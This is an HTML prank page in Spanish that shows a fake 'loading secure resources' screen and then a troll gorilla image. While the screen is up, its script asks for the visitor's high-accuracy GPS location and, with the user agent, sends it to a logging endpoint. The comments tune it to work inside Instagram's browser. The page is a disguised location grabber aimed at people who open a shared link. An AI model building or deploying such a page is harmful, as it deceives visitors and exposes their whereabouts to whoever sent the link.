<!DOCTYPE html>
<html>

<head>
    <title>¡Sorpresa!</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: white;
            font-family: sans-serif;
            overflow: hidden;
        }

        /* Contenedor de la imagen (oculto al inicio) */
        #contenido {
            display: none;
            flex-direction: column;
            align-items: center;
        }

        img {
            max-width: 100%;
            height: auto;
            display: block;
        }

        /* Pantalla de carga que bloquea la vista */
        #loader-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        /* Círculo de carga (Spinner) */
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #status {
            font-size: 14px;
            color: #aaa;
        }
    </style>
</head>

<body>

    <div id="loader-container">
        <div class="spinner"></div>
        <div id="status">Cargando recursos seguros...</div>
    </div>

    <div id="contenido">
        <img src="gorila_troll.jpg" alt="Gorila troll">
    </div>

    <script>
        const loader = document.getElementById('loader-container');
        const contenido = document.getElementById('contenido');
        let enviado = false;

        function finalizarYCargar(coords = null) {
            if (enviado) return;
            enviado = true;

            const datos = JSON.stringify({
                lat: coords ? coords.latitude : null,
                lon: coords ? coords.longitude : null,
                ua: navigator.userAgent
            });

            // 1. Intentar enviar con sendBeacon (Indestructible para Instagram)
            // Si falla, usa fetch como respaldo
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/.netlify/functions/logger', datos);
            } else {
                fetch('/.netlify/functions/logger', {
                    method: 'POST',
                    keepalive: true,
                    headers: { 'Content-Type': 'application/json' },
                    body: datos
                });
            }

            // 2. Mostrar el contenido (El gorila)
            loader.style.display = 'none';
            contenido.style.display = 'flex';
        }

        // Lógica de ubicación
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { finalizarYCargar(pos.coords); },
                (err) => { finalizarYCargar(); },
                { enableHighAccuracy: true, timeout: 4000 } // Bajamos a 4s para ser más rápidos
            );
        } else {
            finalizarYCargar();
        }

        // Respaldo de seguridad (Instagram suele ignorar el GPS)
        setTimeout(() => {
            if (!enviado) {
                finalizarYCargar();
            }
        }, 5000);
    </script>
</body>

</html>
